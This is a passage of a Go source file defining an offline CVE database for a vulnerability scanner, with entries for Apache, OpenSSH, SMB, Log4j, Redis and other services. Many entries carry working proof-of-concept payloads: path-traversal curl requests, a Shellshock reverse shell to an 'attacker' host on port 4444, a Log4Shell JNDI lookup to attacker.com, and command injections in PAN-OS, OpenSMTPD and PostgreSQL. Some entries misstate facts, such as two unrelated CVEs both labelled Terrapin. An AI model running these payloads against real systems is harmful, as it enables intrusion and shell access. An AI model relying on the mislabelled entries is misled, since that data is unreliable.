package cvedb

// CVEEntry represents a known CVE with full details
type CVEEntry struct {
	ID          string
	Score       float64
	Severity    string
	Service     string
	Versions    []string // Affected versions (empty = all)
	Description string
	Impact      string
	PoC         string // Proof of concept info
	Mitigation  string
	References  []string
	Tags        []string // e.g. RCE, LFI, Auth Bypass, etc.
	Year        int
}

// KnownCVEs is the built-in offline CVE database
// Covers: Web, SSH, FTP, SMTP, DB, Redis, Mongo, Elastic, Docker, K8s, VPN, ICS, etc.
var KnownCVEs = []CVEEntry{

	// ─── APACHE HTTP SERVER ────────────────────────────────────────────────
	{
		ID: "CVE-2021-41773", Score: 9.8, Severity: "CRITICAL",
		Service: "http", Year: 2021,
		Versions: []string{"2.4.49"},
		Description: "Path traversal and RCE in Apache 2.4.49 via mod_cgi",
		Impact:      "Remote Code Execution, Directory Traversal",
		PoC:         "curl 'http://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'",
		Mitigation:  "Update to Apache 2.4.50+",
		Tags:        []string{"RCE", "Path Traversal", "In-the-wild"},
	},
	{
		ID: "CVE-2021-42013", Score: 9.8, Severity: "CRITICAL",
		Service: "http", Year: 2021,
		Versions: []string{"2.4.49", "2.4.50"},
		Description: "Incomplete fix for CVE-2021-41773 in Apache 2.4.50 allows RCE",
		Impact:      "Remote Code Execution",
		PoC:         "curl 'http://TARGET/cgi-bin/.%%32%65/.%%32%65/etc/passwd'",
		Mitigation:  "Update to Apache 2.4.51+",
		Tags:        []string{"RCE", "Path Traversal"},
	},
	{
		ID: "CVE-2017-7679", Score: 9.8, Severity: "CRITICAL",
		Service: "http", Year: 2017,
		Description: "Apache mod_mime buffer overread allows RCE",
		Impact:      "Remote Code Execution",
		Mitigation:  "Update Apache HTTP Server",
		Tags:        []string{"Buffer Overflow", "RCE"},
	},
	{
		ID: "CVE-2022-31813", Score: 9.8, Severity: "CRITICAL",
		Service: "http", Year: 2022,
		Description: "Apache HTTP Server may not send correct X-Forwarded-* headers to backend",
		Impact:      "Authentication bypass, IP spoofing",
		Mitigation:  "Update to Apache 2.4.55+",
		Tags:        []string{"Auth Bypass", "IP Spoofing"},
	},
	{
		ID: "CVE-2023-25690", Score: 9.8, Severity: "CRITICAL",
		Service: "http", Year: 2023,
		Description: "HTTP request smuggling in Apache 2.4.0-2.4.55 via mod_proxy",
		Impact:      "Cache poisoning, auth bypass, firewall bypass",
		Mitigation:  "Update to Apache 2.4.56+",
		Tags:        []string{"Request Smuggling", "Auth Bypass"},
	},

	// ─── NGINX ──────────────────────────────────────────────────────────────
	{
		ID: "CVE-2019-20372", Score: 5.3, Severity: "MEDIUM",
		Service: "http", Year: 2019,
		Description: "nginx memory disclosure via specially crafted HTTP/2 requests",
		Impact:      "Information Disclosure",
		Mitigation:  "Update nginx to 1.17.7+",
		Tags:        []string{"Info Disclosure", "HTTP/2"},
	},
	{
		ID: "CVE-2021-23017", Score: 9.4, Severity: "CRITICAL",
		Service: "http", Year: 2021,
		Description: "nginx DNS resolver off-by-one heap write allows RCE",
		Impact:      "Remote Code Execution",
		Mitigation:  "Update nginx to 1.21.0+",
		Tags:        []string{"RCE", "Heap Overflow"},
	},
	{
		ID: "CVE-2022-41741", Score: 8.1, Severity: "HIGH",
		Service: "http", Year: 2022,
		Description: "nginx ngx_http_mp4_module heap corruption via malformed MP4",
		Impact:      "RCE via malformed mp4 file",
		Mitigation:  "Disable mp4 module or update nginx 1.23.2+",
		Tags:        []string{"RCE", "Heap Corruption"},
	},

	// ─── OPENSSH ────────────────────────────────────────────────────────────
	{
		ID: "CVE-2023-38408", Score: 10.0, Severity: "CRITICAL",
		Service: "ssh", Year: 2023,
		Description: "SSH-agent remote code execution via forwarded agent socket (Terrapin)",
		Impact:      "Remote Code Execution via PKCS#11 provider",
		PoC:         "Requires compromised SSH server + ssh-agent forwarding enabled",
		Mitigation:  "Disable SSH agent forwarding, update OpenSSH 9.3p2+",
		Tags:        []string{"RCE", "SSH Agent"},
	},
	{
		ID: "CVE-2024-6387", Score: 8.1, Severity: "HIGH",
		Service: "ssh", Year: 2024,
		Description: "regreSSHion: OpenSSH race condition in signal handler allows unauthenticated RCE",
		Impact:      "Unauthenticated Remote Code Execution as root",
		PoC:         "Race condition in sigalrm handler — timing-based exploit",
		Mitigation:  "Update OpenSSH 9.8p1+, set LoginGraceTime=0 as workaround",
		Tags:        []string{"RCE", "Race Condition", "Unauthenticated", "Critical"},
	},
	{
		ID: "CVE-2023-51767", Score: 7.0, Severity: "HIGH",
		Service: "ssh", Year: 2023,
		Description: "Terrapin attack: SSH prefix truncation weakens connection integrity",
		Impact:      "MitM attack weakening SSH channel security",
		Mitigation:  "Update OpenSSH 9.6+ (strict KEX enabled by default)",
		Tags:        []string{"MitM", "Protocol Weakness"},
	},
	{
		ID: "CVE-2016-0777", Score: 6.4, Severity: "MEDIUM",
		Service: "ssh", Year: 2016,
		Description: "OpenSSH client roaming feature leaks private keys to rogue server",
		Impact:      "Private key disclosure",
		Mitigation:  "UseRoaming no in ssh_config, update OpenSSH 7.1p2+",
		Tags:        []string{"Info Disclosure", "Key Leak"},
	},
	{
		ID: "CVE-2018-15473", Score: 5.3, Severity: "MEDIUM",
		Service: "ssh", Year: 2018,
		Versions: []string{"<7.7"},
		Description: "OpenSSH user enumeration via auth timing side-channel",
		Impact:      "Valid username enumeration",
		PoC:         "ssh -l INVALID_USER target  vs  ssh -l VALID_USER target (timing diff)",
		Mitigation:  "Update OpenSSH 7.7+",
		Tags:        []string{"User Enumeration", "Info Disclosure"},
	},

	// ─── FTP ────────────────────────────────────────────────────────────────
	{
		ID: "CVE-2011-2523", Score: 10.0, Severity: "CRITICAL",
		Service: "ftp", Year: 2011,
		Versions: []string{"2.3.4"},
		Description: "vsftpd 2.3.4 backdoor - connects to port 6200 on :) in username",
		Impact:      "Remote root shell via backdoor",
		PoC:         "USER backdoor:) / PASS anything → shell on port 6200",
		Mitigation:  "Replace vsftpd immediately",
		Tags:        []string{"Backdoor", "RCE", "Root"},
	},
	{
		ID: "CVE-2010-4221", Score: 10.0, Severity: "CRITICAL",
		Service: "ftp", Year: 2010,
		Description: "ProFTPD 1.3.2rc3-1.3.3b SQL injection and stack overflow",
		Impact:      "Remote Code Execution",
		Mitigation:  "Update ProFTPD 1.3.3c+",
		Tags:        []string{"Stack Overflow", "RCE"},
	},
	{
		ID: "CVE-2015-3306", Score: 10.0, Severity: "CRITICAL",
		Service: "ftp", Year: 2015,
		Versions: []string{"1.3.5"},
		Description: "ProFTPD mod_copy allows unauthenticated file copy/read via SITE CPFR/CPTO",
		Impact:      "Read/write any file as FTP user",
		PoC:         "SITE CPFR /etc/passwd\r\nSITE CPTO /var/www/html/passwd.txt",
		Mitigation:  "Disable mod_copy or update ProFTPD 1.3.5e+",
		Tags:        []string{"File Read", "Unauth", "In-the-wild"},
	},

	// ─── SMTP / MAIL ────────────────────────────────────────────────────────
	{
		ID: "CVE-2020-7247", Score: 10.0, Severity: "CRITICAL",
		Service: "smtp", Year: 2020,
		Description: "OpenSMTPD RCE via malicious MAIL FROM address",
		Impact:      "Remote Code Execution as root",
		PoC:         "MAIL FROM:<;sleep 10;>",
		Mitigation:  "Update OpenSMTPD 6.6.4+",
		Tags:        []string{"RCE", "Root", "In-the-wild"},
	},
	{
		ID: "CVE-2019-15846", Score: 9.8, Severity: "CRITICAL",
		Service: "smtp", Year: 2019,
		Description: "Exim heap overflow in string_interpret_escape() allows RCE",
		Impact:      "Remote Code Execution",
		Mitigation:  "Update Exim 4.92.2+",
		Tags:        []string{"Heap Overflow", "RCE"},
	},
	{
		ID: "CVE-2021-38371", Score: 7.5, Severity: "HIGH",
		Service: "smtp", Year: 2021,
		Description: "Postfix SMTP smuggling attack allows spoofed email",
		Impact:      "Email spoofing, SPF/DKIM bypass",
		Mitigation:  "Update Postfix, enable smtpd_forbid_bare_newline",
		Tags:        []string{"Email Spoofing", "Request Smuggling"},
	},

	// ─── MYSQL / MARIADB ────────────────────────────────────────────────────
	{
		ID: "CVE-2016-6662", Score: 10.0, Severity: "CRITICAL",
		Service: "mysql", Year: 2016,
		Description: "MySQL arbitrary file overwrite via malicious config injection",
		Impact:      "Remote Code Execution as root via mysqld config",
		PoC:         "Requires FILE privilege: SELECT INTO OUTFILE '/etc/mysql/conf.d/evil.cnf'",
		Mitigation:  "Update MySQL 5.5.52+/5.6.33+/5.7.15+",
		Tags:        []string{"RCE", "File Write", "Root"},
	},
	{
		ID: "CVE-2012-2122", Score: 7.5, Severity: "HIGH",
		Service: "mysql", Year: 2012,
		Description: "MySQL auth bypass via repeated auth attempts due to memcmp issue",
		Impact:      "Authentication bypass (1 in 256 chance per attempt)",
		PoC:         "for i in $(seq 1 1000); do mysql -u root --password=bad -h TARGET; done",
		Mitigation:  "Update MySQL 5.1.63+/5.5.24+/5.6.6+",
		Tags:        []string{"Auth Bypass", "Brute Force"},
	},
	{
		ID: "CVE-2021-27928", Score: 7.2, Severity: "HIGH",
		Service: "mysql", Year: 2021,
		Description: "MariaDB wsrep provider plugin RCE via WSREP_PROVIDER variable",
		Impact:      "Remote Code Execution as root",
		PoC:         "SET GLOBAL wsrep_provider='/tmp/evil.so';",
		Mitigation:  "Update MariaDB 10.2.37+/10.3.28+/10.4.18+/10.5.9+",
		Tags:        []string{"RCE", "Root"},
	},

	// ─── POSTGRESQL ─────────────────────────────────────────────────────────
	{
		ID: "CVE-2019-9193", Score: 7.2, Severity: "HIGH",
		Service: "postgresql", Year: 2019,
		Description: "PostgreSQL COPY TO/FROM PROGRAM allows arbitrary command execution",
		Impact:      "Remote Code Execution as postgres user",
		PoC:         "COPY (SELECT '') TO PROGRAM 'id > /tmp/pwned'",
		Mitigation:  "Restrict superuser access, update PostgreSQL 11.3+",
		Tags:        []string{"RCE", "Superuser Required"},
	},
	{
		ID: "CVE-2022-1552", Score: 8.8, Severity: "HIGH",
		Service: "postgresql", Year: 2022,
		Description: "PostgreSQL Autovacuum ANALYZE privilege escalation to superuser",
		Impact:      "Privilege escalation to superuser",
		Mitigation:  "Update PostgreSQL 14.3+/13.7+/12.11+",
		Tags:        []string{"Privilege Escalation"},
	},

	// ─── REDIS ──────────────────────────────────────────────────────────────
	{
		ID: "CVE-2022-0543", Score: 10.0, Severity: "CRITICAL",
		Service: "redis", Year: 2022,
		Description: "Debian/Ubuntu Redis Lua sandbox escape via Lua library package",
		Impact:      "Sandbox escape → Remote Code Execution",
		PoC:         "eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\",\"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\",\"r\"); local res = f:read(\"*a\"); f:close(); return res' 0",
		Mitigation:  "Update Redis package on Debian/Ubuntu systems",
		Tags:        []string{"RCE", "Sandbox Escape", "Lua", "Critical"},
	},
	{
		ID: "CVE-2021-32761", Score: 7.5, Severity: "HIGH",
		Service: "redis", Year: 2021,
		Description: "Redis GETDEL/GETEX integer overflow in 32-bit systems",
		Impact:      "Remote Code Execution on 32-bit Redis",
		Mitigation:  "Update Redis 6.2.5+/6.0.15+/5.0.13+",
		Tags:        []string{"Integer Overflow", "RCE"},
	},
	{
		ID: "CVE-2023-41056", Score: 8.1, Severity: "HIGH",
		Service: "redis", Year: 2023,
		Description: "Redis heap overflow in listpack entries manipulation",
		Impact:      "Heap corruption → potential RCE",
		Mitigation:  "Update Redis 7.0.15+/7.2.4+",
		Tags:        []string{"Heap Overflow", "RCE"},
	},
	{
		ID: "CVE-2024-31449", Score: 7.0, Severity: "HIGH",
		Service: "redis", Year: 2024,
		Description: "Redis Lua library BITFIELD_RO authenticated RCE",
		Impact:      "Authenticated Remote Code Execution",
		Mitigation:  "Update Redis 7.2.6+/7.4.1+",
		Tags:        []string{"RCE", "Authenticated"},
	},

	// ─── MONGODB ────────────────────────────────────────────────────────────
	{
		ID: "CVE-2013-4650", Score: 6.5, Severity: "MEDIUM",
		Service: "mongodb", Year: 2013,
		Description: "MongoDB JavaScript injection via $where operator without auth",
		Impact:      "Data exfiltration via JS injection",
		PoC:         `db.collection.find({$where: "sleep(5000)"})`,
		Mitigation:  "Enable auth, disable --noscripting, update MongoDB 2.4.5+",
		Tags:        []string{"JS Injection", "NoSQLi"},
	},
	{
		ID: "CVE-2021-20330", Score: 6.5, Severity: "MEDIUM",
		Service: "mongodb", Year: 2021,
		Description: "MongoDB improper authorization in aggregation pipeline",
		Impact:      "Unauthorized data access",
		Mitigation:  "Update MongoDB 4.4.3+/4.2.12+",
		Tags:        []string{"Auth Bypass", "Info Disclosure"},
	},

	// ─── ELASTICSEARCH ──────────────────────────────────────────────────────
	{
		ID: "CVE-2014-3120", Score: 7.5, Severity: "HIGH",
		Service: "elasticsearch", Year: 2014,
		Description: "Elasticsearch dynamic script execution allows arbitrary OS command execution",
		Impact:      "Remote Code Execution via Groovy/MVEL scripts",
		PoC:         `curl -XGET 'http://TARGET:9200/_search?pretty' -d '{"script_fields":{"myfield":{"script":"java.lang.Runtime.getRuntime().exec(\"id\")"}}}'`,
		Mitigation:  "Disable dynamic scripting, update ES 1.3.8+/1.4.3+",
		Tags:        []string{"RCE", "Script Injection"},
	},
	{
		ID: "CVE-2021-22145", Score: 6.5, Severity: "MEDIUM",
		Service: "elasticsearch", Year: 2021,
		Description: "Elasticsearch sensitive info disclosure in error messages",
		Impact:      "Information disclosure of internal paths",
		Mitigation:  "Update Elasticsearch 7.13.4+",
		Tags:        []string{"Info Disclosure"},
	},
	{
		ID: "CVE-2023-31419", Score: 7.5, Severity: "HIGH",
		Service: "elasticsearch", Year: 2023,
		Description: "Elasticsearch StackOverflow via specially crafted query",
		Impact:      "Denial of Service",
		Mitigation:  "Update Elasticsearch 8.9.1+",
		Tags:        []string{"DoS"},
	},

	// ─── SSL/TLS ─────────────────────────────────────────────────────────────
	{
		ID: "CVE-2014-0160", Score: 7.5, Severity: "HIGH",
		Service: "https", Year: 2014,
		Description: "Heartbleed: OpenSSL heartbeat extension buffer over-read leaks memory",
		Impact:      "Memory disclosure: private keys, passwords, session tokens",
		PoC:         "Heartbleed PoC: send malformed TLS heartbeat, read 64KB server memory",
		Mitigation:  "Update OpenSSL 1.0.1g+, regenerate all certs/keys",
		Tags:        []string{"Memory Disclosure", "Key Leak", "Critical", "In-the-wild"},
	},
	{
		ID: "CVE-2014-3566", Score: 3.4, Severity: "LOW",
		Service: "https", Year: 2014,
		Description: "POODLE: SSLv3 CBC padding oracle allows MitM decryption",
		Impact:      "HTTPS session decryption via downgrade attack",
		Mitigation:  "Disable SSLv3, use TLS 1.2+ only",
		Tags:        []string{"MitM", "Downgrade Attack"},
	},
	{
		ID: "CVE-2015-0204", Score: 4.3, Severity: "MEDIUM",
		Service: "https", Year: 2015,
		Description: "FREAK: RSA export cipher downgrade attack",
		Impact:      "Forced use of weak RSA export keys (512-bit)",
		Mitigation:  "Disable export cipher suites",
		Tags:        []string{"MitM", "Downgrade Attack"},
	},
	{
		ID: "CVE-2016-0800", Score: 5.9, Severity: "MEDIUM",
		Service: "https", Year: 2016,
		Description: "DROWN: SSLv2 cross-protocol attack decrypts TLS sessions",
		Impact:      "TLS session decryption via SSLv2 oracle",
		Mitigation:  "Disable SSLv2 on all servers sharing same key",
		Tags:        []string{"MitM", "Downgrade Attack"},
	},
	{
		ID: "CVE-2021-3449", Score: 7.4, Severity: "HIGH",
		Service: "https", Year: 2021,
		Description: "OpenSSL NULL ptr deref in TLS renegotiation via malformed signature_algorithms",
		Impact:      "Server crash / Denial of Service",
		Mitigation:  "Update OpenSSL 1.1.1k+",
		Tags:        []string{"DoS", "NULL Deref"},
	},
	{
		ID: "CVE-2022-0778", Score: 7.5, Severity: "HIGH",
		Service: "https", Year: 2022,
		Description: "OpenSSL infinite loop in BN_mod_sqrt() via malformed certificate",
		Impact:      "Denial of Service via infinite loop",
		Mitigation:  "Update OpenSSL 3.0.2+/1.1.1n+",
		Tags:        []string{"DoS", "Infinite Loop"},
	},

	// ─── SMB / WINDOWS ──────────────────────────────────────────────────────
	{
		ID: "CVE-2017-0144", Score: 9.8, Severity: "CRITICAL",
		Service: "microsoft-ds", Year: 2017,
		Description: "EternalBlue: SMBv1 buffer overflow allows unauthenticated RCE (used by WannaCry)",
		Impact:      "Unauthenticated Remote Code Execution as SYSTEM",
		PoC:         "ms17_010_eternalblue module in Metasploit",
		Mitigation:  "Apply MS17-010, disable SMBv1, block port 445",
		Tags:        []string{"RCE", "SYSTEM", "Unauthenticated", "Wormable", "Critical"},
	},
	{
		ID: "CVE-2017-0145", Score: 9.8, Severity: "CRITICAL",
		Service: "microsoft-ds", Year: 2017,
		Description: "EternalRomance: SMBv1 transaction info disclosure + type confusion RCE",
		Impact:      "Unauthenticated Remote Code Execution",
		Mitigation:  "Apply MS17-010, disable SMBv1",
		Tags:        []string{"RCE", "Unauthenticated", "NSA Leak"},
	},
	{
		ID: "CVE-2020-0796", Score: 10.0, Severity: "CRITICAL",
		Service: "microsoft-ds", Year: 2020,
		Description: "SMBGhost: SMBv3 compression buffer overflow — unauthenticated kernel RCE",
		Impact:      "Kernel Remote Code Execution, Wormable",
		PoC:         "Compressed SMB3 packet triggers integer overflow in srv2.sys",
		Mitigation:  "Apply KB4551762, disable SMBv3 compression",
		Tags:        []string{"RCE", "Kernel", "Wormable", "Unauthenticated"},
	},
	{
		ID: "CVE-2021-34527", Score: 8.8, Severity: "HIGH",
		Service: "microsoft-ds", Year: 2021,
		Description: "PrintNightmare: Windows Print Spooler RCE via malicious printer driver",
		Impact:      "Remote Code Execution as SYSTEM via print spooler",
		PoC:         "Invoke-PrintNightmare.ps1 / cube0x0/CVE-2021-1675",
		Mitigation:  "Disable Print Spooler, apply KB5004945",
		Tags:        []string{"RCE", "SYSTEM", "In-the-wild"},
	},
	{
		ID: "CVE-2021-42278", Score: 8.8, Severity: "HIGH",
		Service: "microsoft-ds", Year: 2021,
		Description: "noPac: SAMAccountName spoofing + Kerberos privilege escalation to Domain Admin",
		Impact:      "Domain Admin privilege escalation from regular user",
		PoC:         "noPac.py scanner + exploit tool",
		Mitigation:  "Apply KB5008102, KB5008380",
		Tags:        []string{"Privilege Escalation", "Active Directory", "Domain Admin"},
	},
	{
		ID: "CVE-2022-26923", Score: 8.8, Severity: "HIGH",
		Service: "microsoft-ds", Year: 2022,
		Description: "Certifried: AD CS certificate privilege escalation to Domain Admin",
		Impact:      "Privilege escalation via certificate spoofing",
		Mitigation:  "Apply KB5014754, update AD CS settings",
		Tags:        []string{"Privilege Escalation", "Active Directory", "AD CS"},
	},

	// ─── RDP ────────────────────────────────────────────────────────────────
	{
		ID: "CVE-2019-0708", Score: 9.8, Severity: "CRITICAL",
		Service: "ms-wbt-server", Year: 2019,
		Description: "BlueKeep: RDP pre-auth use-after-free allows unauthenticated kernel RCE",
		Impact:      "Unauthenticated kernel RCE, Wormable",
		PoC:         "ms/rdp/cve_2019_0708_bluekeep_rce in Metasploit",
		Mitigation:  "Apply KB4499175, disable RDP if unused, enable NLA",
		Tags:        []string{"RCE", "Kernel", "Wormable", "Unauthenticated"},
	},
	{
		ID: "CVE-2019-1182", Score: 9.8, Severity: "CRITICAL",
		Service: "ms-wbt-server", Year: 2019,
		Description: "DejaBlue: RDP pre-auth integer overflow — unauthenticated RCE",
		Impact:      "Unauthenticated Remote Code Execution",
		Mitigation:  "Apply August 2019 Windows updates",
		Tags:        []string{"RCE", "Unauthenticated", "Integer Overflow"},
	},
	{
		ID: "CVE-2023-35332", Score: 6.8, Severity: "MEDIUM",
		Service: "ms-wbt-server", Year: 2023,
		Description: "Windows RDP security feature bypass via deprecated protocols",
		Impact:      "Security feature bypass, MitM",
		Mitigation:  "Apply July 2023 Windows updates",
		Tags:        []string{"Security Bypass", "MitM"},
	},

	// ─── VNC ────────────────────────────────────────────────────────────────
	{
		ID: "CVE-2006-2369", Score: 7.5, Severity: "HIGH",
		Service: "vnc", Year: 2006,
		Description: "RealVNC auth bypass via None authentication type",
		Impact:      "Authentication bypass — no password required",
		PoC:         "Connect with VNC client and select None auth type",
		Mitigation:  "Enforce VncAuth or better, update RealVNC",
		Tags:        []string{"Auth Bypass", "Unauthenticated"},
	},
	{
		ID: "CVE-2019-15681", Score: 7.5, Severity: "HIGH",
		Service: "vnc", Year: 2019,
		Description: "LibVNCServer memory leak exposes sensitive data to clients",
		Impact:      "Memory disclosure including heap contents",
		Mitigation:  "Update LibVNCServer 0.9.13+",
		Tags:        []string{"Memory Disclosure"},
	},

	// ─── DOCKER / KUBERNETES ────────────────────────────────────────────────
	{
		ID: "CVE-2019-5736", Score: 8.6, Severity: "HIGH",
		Service: "docker", Year: 2019,
		Description: "runc container escape via /proc/self/exe symlink overwrite",
		Impact:      "Container escape to host root",
		PoC:         "Malicious container image triggers runc overwrite",
		Mitigation:  "Update runc 1.0-rc6.1+/Docker 18.09.2+",
		Tags:        []string{"Container Escape", "Root", "Critical"},
	},
	{
		ID: "CVE-2022-0847", Score: 7.8, Severity: "HIGH",
		Service: "docker", Year: 2022,
		Description: "Dirty Pipe: Linux kernel pipe privilege escalation (affects containers)",
		Impact:      "Container privilege escalation to root via kernel pipe bug",
		PoC:         "Write to read-only file via splice → overwrite /etc/passwd",
		Mitigation:  "Update kernel 5.16.11+/5.15.25+/5.10.102+",
		Tags:        []string{"Privilege Escalation", "Kernel", "Container Escape"},
	},
	{
		ID: "CVE-2018-1002105", Score: 9.8, Severity: "CRITICAL",
		Service: "kubernetes-api", Year: 2018,
		Description: "Kubernetes API server proxy escalation allows unauthenticated backend access",
		Impact:      "Unauthenticated access to backend Kubernetes APIs",
		Mitigation:  "Update Kubernetes 1.10.11+/1.11.5+/1.12.3+/1.13.0-rc.1+",
		Tags:        []string{"Auth Bypass", "Unauthenticated", "Kubernetes"},
	},
	{
		ID: "CVE-2022-3294", Score: 8.8, Severity: "HIGH",
		Service: "kubernetes-api", Year: 2022,
		Description: "Kubernetes node address isn't always verified for proxied connections",
		Impact:      "SSRF to internal Kubernetes node services",
		Mitigation:  "Update Kubernetes 1.25.4+",
		Tags:        []string{"SSRF", "Kubernetes"},
	},

	// ─── MEMCACHED ──────────────────────────────────────────────────────────
	{
		ID: "CVE-2016-8704", Score: 9.8, Severity: "CRITICAL",
		Service: "memcached", Year: 2016,
		Description: "Memcached integer overflow in append/prepend commands allows RCE",
		Impact:      "Remote Code Execution",
		Mitigation:  "Update Memcached 1.4.33+",
		Tags:        []string{"Integer Overflow", "RCE"},
	},
	{
		ID: "CVE-2022-48571", Score: 7.5, Severity: "HIGH",
		Service: "memcached", Year: 2022,
		Description: "Memcached NULL pointer dereference in proxy mode",
		Impact:      "Denial of Service",
		Mitigation:  "Update Memcached 1.6.18+",
		Tags:        []string{"DoS", "NULL Deref"},
	},

	// ─── RABBITMQ ───────────────────────────────────────────────────────────
	{
		ID: "CVE-2023-46118", Score: 7.5, Severity: "HIGH",
		Service: "amqp", Year: 2023,
		Description: "RabbitMQ HTTP API DoS via large message body in queue bindings",
		Impact:      "Denial of Service via memory exhaustion",
		Mitigation:  "Update RabbitMQ 3.11.25+/3.12.8+",
		Tags:        []string{"DoS"},
	},

	// ─── WORDPRESS ──────────────────────────────────────────────────────────
	{
		ID: "CVE-2017-8295", Score: 5.9, Severity: "MEDIUM",
		Service: "http", Year: 2017,
		Description: "WordPress password reset link sent to wrong address via Host header injection",
		Impact:      "Account takeover via Host header manipulation",
		PoC:         "Host: evil.com in password reset request",
		Mitigation:  "Update WordPress 4.7.5+, configure server to reject invalid Host headers",
		Tags:        []string{"Host Header Injection", "Account Takeover"},
	},
	{
		ID: "CVE-2019-8942", Score: 8.8, Severity: "HIGH",
		Service: "http", Year: 2019,
		Description: "WordPress authenticated RCE via image crop and path traversal",
		Impact:      "Authenticated Remote Code Execution",
		Mitigation:  "Update WordPress 5.0.1+",
		Tags:        []string{"RCE", "Authenticated", "Path Traversal"},
	},
	{
		ID: "CVE-2022-21661", Score: 7.5, Severity: "HIGH",
		Service: "http", Year: 2022,
		Description: "WordPress WP_Query SQL injection via post taxonomy queries",
		Impact:      "SQL Injection → data exfiltration",
		Mitigation:  "Update WordPress 5.8.3+",
		Tags:        []string{"SQL Injection"},
	},

	// ─── LOG4SHELL & RECENT CRITICAL ────────────────────────────────────────
	{
		ID: "CVE-2021-44228", Score: 10.0, Severity: "CRITICAL",
		Service: "http", Year: 2021,
		Description: "Log4Shell: Apache Log4j2 JNDI injection allows unauthenticated RCE",
		Impact:      "Unauthenticated Remote Code Execution via any user-controlled input",
		PoC:         "${jndi:ldap://attacker.com/exploit} in any logged field (User-Agent, X-Forwarded-For, etc.)",
		Mitigation:  "Update Log4j2 2.17.1+/2.12.4+/2.3.2+; set log4j2.formatMsgNoLookups=true",
		Tags:        []string{"RCE", "JNDI", "Unauthenticated", "Critical", "In-the-wild"},
	},
	{
		ID: "CVE-2021-45046", Score: 9.0, Severity: "CRITICAL",
		Service: "http", Year: 2021,
		Description: "Log4Shell bypass: RCE in Log4j2 2.15.0 via Thread Context lookup patterns",
		Impact:      "Remote Code Execution (bypass of initial patch)",
		Mitigation:  "Update Log4j2 2.16.0+",
		Tags:        []string{"RCE", "JNDI", "Bypass"},
	},
	{
		ID: "CVE-2022-22965", Score: 9.8, Severity: "CRITICAL",
		Service: "http", Year: 2022,
		Description: "Spring4Shell: Spring Framework RCE via data binding on JDK9+",
		Impact:      "Unauthenticated Remote Code Execution in Spring apps",
		PoC:         "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di",
		Mitigation:  "Update Spring Framework 5.3.18+/5.2.20+",
		Tags:        []string{"RCE", "Unauthenticated", "Spring", "Critical"},
	},
	{
		ID: "CVE-2023-44487", Score: 7.5, Severity: "HIGH",
		Service: "http", Year: 2023,
		Description: "HTTP/2 Rapid Reset Attack - DoS via HEADERS+RST_STREAM flood",
		Impact:      "Denial of Service (used in largest DDoS attacks in history)",
		PoC:         "Send thousands of HTTP/2 streams immediately reset them",
		Mitigation:  "Update web servers; apply rate limiting on HTTP/2 streams",
		Tags:        []string{"DoS", "HTTP/2", "DDoS"},
	},
	{
		ID: "CVE-2024-3400", Score: 10.0, Severity: "CRITICAL",
		Service: "http", Year: 2024,
		Description: "PAN-OS GlobalProtect: OS command injection via crafted SESSID cookie (0-day)",
		Impact:      "Unauthenticated root RCE on Palo Alto firewalls",
		PoC:         "Cookie: SESSID=/../../../../../opt/panlogs/../tmp/device_telemetry/hour/`CMD`",
		Mitigation:  "Apply Palo Alto hotfix immediately, disable GlobalProtect if not needed",
		Tags:        []string{"RCE", "Root", "0-day", "Firewall", "Unauthenticated"},
	},
	{
		ID: "CVE-2024-21762", Score: 9.8, Severity: "CRITICAL",
		Service: "http", Year: 2024,
		Description: "Fortinet FortiOS SSL-VPN out-of-bound write allows unauthenticated RCE",
		Impact:      "Unauthenticated Remote Code Execution on FortiGate firewalls",
		Mitigation:  "Update FortiOS 7.4.3+/7.2.7+/7.0.14+/6.4.15+",
		Tags:        []string{"RCE", "Unauthenticated", "VPN", "0-day"},
	},
	{
		ID: "CVE-2023-20198", Score: 10.0, Severity: "CRITICAL",
		Service: "http", Year: 2023,
		Description: "Cisco IOS XE Web UI unauthenticated privilege 15 account creation (0-day)",
		Impact:      "Full device takeover without authentication",
		PoC:         "POST /webui/logoutconfirm.html?logon_hash=1 with crafted body",
		Mitigation:  "Disable HTTP/HTTPS server on internet-facing IOS XE devices",
		Tags:        []string{"Auth Bypass", "0-day", "Cisco", "Network Device"},
	},

	// ─── TELNET / LEGACY ────────────────────────────────────────────────────
	{
		ID: "CVE-1999-0619", Score: 10.0, Severity: "CRITICAL",
		Service: "telnet", Year: 1999,
		Description: "Telnet transmits credentials in cleartext — passive interception",
		Impact:      "Credential theft via network sniffing",
		Mitigation:  "Replace Telnet with SSH immediately",
		Tags:        []string{"Cleartext Credentials", "Insecure Protocol"},
	},

	// ─── DNS ────────────────────────────────────────────────────────────────
	{
		ID: "CVE-2020-1350", Score: 10.0, Severity: "CRITICAL",
		Service: "dns", Year: 2020,
		Description: "SIGRed: Windows DNS Server wormable heap overflow via SIG record",
		Impact:      "Unauthenticated RCE as SYSTEM on Windows DNS servers",
		Mitigation:  "Apply KB4569509, limit DNS message size as workaround",
		Tags:        []string{"RCE", "SYSTEM", "Wormable", "Windows DNS"},
	},
	{
		ID: "CVE-2008-1447", Score: 6.8, Severity: "MEDIUM",
		Service: "dns", Year: 2008,
		Description: "Kaminsky DNS cache poisoning via predictable transaction IDs",
		Impact:      "DNS cache poisoning → traffic hijacking",
		Mitigation:  "Enable source port randomization, use DNSSEC",
		Tags:        []string{"DNS Poisoning", "Cache Poisoning"},
	},

	// ─── SNMP ───────────────────────────────────────────────────────────────
	{
		ID: "CVE-2002-0013", Score: 10.0, Severity: "CRITICAL",
		Service: "snmp", Year: 2002,
		Description: "Multiple SNMP implementations buffer overflow via malformed SNMP messages",
		Impact:      "Remote Code Execution via SNMP v1 trap",
		Mitigation:  "Use SNMPv3 with auth+priv, restrict access by IP",
		Tags:        []string{"Buffer Overflow", "RCE"},
	},

	// ─── MISC WEB ────────────────────────────────────────────────────────────
	{
		ID: "CVE-2014-6271", Score: 10.0, Severity: "CRITICAL",
		Service: "http", Year: 2014,
		Description: "Shellshock: Bash function definition via environment variable allows RCE",
		Impact:      "Unauthenticated RCE via CGI scripts using bash",
		PoC:         `curl -A "() { :; }; /bin/bash -i >& /dev/tcp/attacker/4444 0>&1" http://TARGET/cgi-bin/test.cgi`,
		Mitigation:  "Update bash to patched version",
		Tags:        []string{"RCE", "CGI", "Unauthenticated", "In-the-wild"},
	},
	{
		ID: "CVE-2017-5638", Score: 10.0, Severity: "CRITICAL",
		Service: "http", Year: 2017,
